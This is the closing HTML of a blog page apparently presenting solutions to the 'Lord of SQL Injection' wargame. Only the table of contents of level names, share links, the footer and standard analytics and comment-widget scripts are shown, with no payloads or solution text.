href="#3-goblin"><span class="toc-number">3.</span> <span class="toc-text">3. goblin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-orc"><span class="toc-number">4.</span> <span class="toc-text">4. orc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-wolfman"><span class="toc-number">5.</span> <span class="toc-text">5. wolfman</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-darkelf"><span class="toc-number">6.</span> <span class="toc-text">6. darkelf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-orge"><span class="toc-number">7.</span> <span class="toc-text">7. orge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-troll"><span class="toc-number">8.</span> <span class="toc-text">8. troll</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-vampire"><span class="toc-number">9.</span> <span class="toc-text">9. vampire</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-skeleton"><span class="toc-number">10.</span> <span class="toc-text">10. skeleton</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-golem"><span class="toc-number">11.</span> <span class="toc-text">11. golem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-darkknight"><span class="toc-number">12.</span> <span class="toc-text">12. darkknight</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-bugbear"><span class="toc-number">13.</span> <span class="toc-text">13. bugbear</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14-giant"><span class="toc-number">14.</span> <span class="toc-text">14. giant</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#15-assassin"><span class="toc-number">15.</span> <span class="toc-text">15. assassin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#16-zombie-assassin"><span class="toc-number">16.</span> <span class="toc-text">16. zombie_assassin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#17-succubus"><span class="toc-number">17.</span> <span class="toc-text">17. succubus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#18-nightmare"><span class="toc-number">18.</span> <span class="toc-text">18. nightmare</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#19-xavis"><span class="toc-number">19.</span> <span class="toc-text">19. xavis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#20-dragon"><span class="toc-number">20.</span> <span class="toc-text">20. dragon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#21-iron-golem"><span class="toc-number">21.</span> <span class="toc-text">21. iron_golem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22-dark-eyes"><span class="toc-number">22.</span> <span class="toc-text">22. dark_eyes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#23-hell-fire"><span class="toc-number">23.</span> <span class="toc-text">23. hell_fire</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#24-evil-wizard"><span class="toc-number">24.</span> <span class="toc-text">24. evil_wizard</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#25-green-dragon"><span class="toc-number">25.</span> <span class="toc-text">25. green_dragon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#26-red-dragon"><span class="toc-number">26.</span> <span class="toc-text">26. red_dragon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#27-blue-dragon"><span class="toc-number">27.</span> <span class="toc-text">27. blue_dragon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#28-frankenstein"><span class="toc-number">28.</span> <span class="toc-text">28. frankenstein</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#29-phantom"><span class="toc-number">29.</span> <span class="toc-text">29. phantom</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#30-ouroboros"><span class="toc-number">30.</span> <span class="toc-text">30. ouroboros</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#31-zombie"><span class="toc-number">31.</span> <span class="toc-text">31. zombie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#32-alien"><span class="toc-number">32.</span> <span class="toc-text">32. alien</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#33-cthulhu"><span class="toc-number">33.</span> <span class="toc-text">33. cthulhu</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#34-death"><span class="toc-number">34.</span> <span class="toc-text">34. death</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#35-godzilla"><span class="toc-number">35.</span> <span class="toc-text">35. godzilla</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#36-cyclops"><span class="toc-number">36.</span> <span class="toc-text">36. cyclops</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#37-chupacabra"><span class="toc-number">37.</span> <span class="toc-text">37. chupacabra</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#38-manticore"><span class="toc-number">38.</span> <span class="toc-text">38. manticore</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#39-banshee"><span class="toc-number">39.</span> <span class="toc-text">39. banshee</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#40-poltergeist"><span class="toc-number">40.</span> <span class="toc-text">40. poltergeist</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#41-nessie"><span class="toc-number">41.</span> <span class="toc-text">41. nessie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#42-revenant"><span class="toc-number">42.</span> <span class="toc-text">42. revenant</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#43-yeti"><span class="toc-number">43.</span> <span class="toc-text">43. yeti</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#44-mummy"><span class="toc-number">44.</span> <span class="toc-text">44. mummy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#45-kraken"><span class="toc-number">45.</span> <span class="toc-text">45. kraken</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#46-cerberus"><span class="toc-number">46.</span> <span class="toc-text">46. cerberus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#47-siren"><span class="toc-number">47.</span> <span class="toc-text">47. siren</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#48-incubus"><span class="toc-number">48.</span> <span class="toc-text">48. incubus</span></a></li></ol></div><div id="share-footer" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.p6.is/los-solution/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.p6.is/los-solution/&text=Lord of SQL Injection(LOS) Complete Solution"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li></ul></div><div id="actions-footer"><a id="menu" class="icon" href="#" onclick='return $("#nav-footer").toggle(),!1'><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a> <a id="toc" class="icon" href="#" onclick='return $("#toc-footer").toggle(),!1'><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a> <a id="share" class="icon" href="#" onclick='return $("#share-footer").toggle(),!1'><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a> <a id="top" style="display:none" class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></div></div></div><footer id="footer"><div class="footer-left">Copyright &copy; 2022 posix</div><div class="footer-right"><nav><ul><li><a href="/about/">About</a></li><li><a href="/posts/">Posts</a></li><li><a href="/category/">Category</a></li><li><a href="/search/">Search</a></li></ul></nav></div></footer></div><link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"><link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css"><script src="/lib/jquery/jquery.min.js"></script><script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script>$(function(){$(".highlight table").before('<span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="far fa-clone"></i></span>'),new ClipboardJS(".btn-copy",{text:function(e){return Array.from(e.nextElementSibling.querySelectorAll(".code")).reduce((e,t)=>e+t.innerText+"\n","")}}).on("success",function(e){e.trigger.setAttribute("aria-label","Copied!"),e.clearSelection()})})</script><script src="/js/main.js"></script><script>!function(e,a,t,n,g,c){e.GoogleAnalyticsObject=n,e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=+new Date,g=a.createElement(t),c=a.getElementsByTagName(t)[0],g.async=1,g.src="//www.google-analytics.com/analytics.js",c.parentNode.insertBefore(g,c)}(window,document,"script","ga"),ga("create","UA-158869268-1","auto"),ga("send","pageview")</script><script>var disqus_shortname="posix-blog";!function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="//"+disqus_shortname+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)}()</script></body></html>